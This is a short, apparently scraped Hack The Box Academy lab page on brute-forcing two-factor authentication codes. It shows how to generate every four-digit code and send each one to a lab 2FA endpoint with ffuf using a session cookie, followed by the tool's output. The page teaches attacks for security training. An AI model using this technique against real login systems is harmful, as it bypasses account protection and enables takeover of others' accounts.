<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/80/section/777
// Platform Version: V1
// Module ID: 80
// Module Name: Broken Authentication
// Module Difficulty: Medium
// Section ID: 777
// Section Title: Brute-Forcing 2FA Codes
// Page Title: Hack The Box - Academy
// Page Number: 6
-->

# Brute-Forcing 2FA Codes

**Module Name:** Broken Authentication **Page Number:** 6

#### 

#### BROKEN AUTHENTICATION

# Brute-Forcing 2FA Codes

## Attacking Two-Factor Authentication (2FA)

![https://academy.hackthebox.com/storage/modules/269/bf/bf_2fa_1.png](https://academy.hackthebox.com/storage/modules/269/bf/bf_2fa_1.png)

![https://academy.hackthebox.com/storage/modules/269/bf/bf_2fa_2.png](https://academy.hackthebox.com/storage/modules/269/bf/bf_2fa_2.png)

``` shell-session
ndefstathiou@htb[/htb]$ seq -w 0 9999 > tokens.txt
```

``` shell-session
ndefstathiou@htb[/htb]$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 648ms]
    * FUZZ: 6513
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 635ms]
    * FUZZ: 6514

<SNIP>
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
    * FUZZ: 9999
```

# 

# 

#### Questions

####